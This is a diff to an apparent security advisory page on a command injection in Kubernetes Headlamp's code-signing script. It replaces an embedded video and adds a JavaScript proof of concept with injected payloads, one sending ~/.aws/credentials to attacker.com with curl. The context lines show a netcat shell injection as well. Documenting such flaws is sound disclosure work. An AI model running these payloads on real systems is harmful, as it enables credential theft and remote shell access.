@@ -28,16 +28,17 @@ discoveryDate: 2025-05-28
 ## Proof of Concept Video
 
 <div class="video-container">
-  <iframe
-    width="100%"
-    height="100%"
-    src="https://www.youtube.com/embed/MR3yWuKSv8Q?si=sY8y7PTue3pAOBP1&amp;autoplay=1&amp;controls=1&amp;rel=0&amp;showinfo=0&amp;modestbranding=1"
-    title="Kubernetes Headlamp Code Signing Command Injection PoC"
-    frameborder="0"
-    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
-    allowfullscreen
+  <video 
+    width="100%" 
+    height="100%" 
+    controls 
+    autoplay 
+    muted
     style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
-  ></iframe>
+  >
+    <source src="/videos/kubernetes-headlamp-poc.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
 </div>
 
 <style>
@@ -94,6 +95,30 @@ mkdir -p "/Applications/Headlamp.app; nc -l 4444 -e /bin/bash; #"
 ```bash
 cat /tmp/headlamp_poc  # Shows "EXPLOITED"
 # Or get reverse shell
+```
+
+## Proof of Concept
+
+### Interactive Exploit
+```javascript
+// exploit.js
+const { execSync } = require('child_process');
+
+const payloads = [
+  'TeamID" && id > /tmp/exploit_output #',
+  'TeamID" | curl -X POST https://attacker.com/exfil -d @~/.aws/credentials #',
+  'TeamID" && open -a Calculator #'
+];
+
+payloads.forEach(p => {
+  process.env.DEVELOPER_TEAM_ID = p;
+  try {
+    require('./codeSign')({ app: '/Applications/Headlamp.app' });
+    console.log(`Payload executed: ${p}`);
+  } catch (e) {
+    console.log(`Payload failed: ${p}`);
+  }
+});
 ```
 
 ## Vulnerability Flow
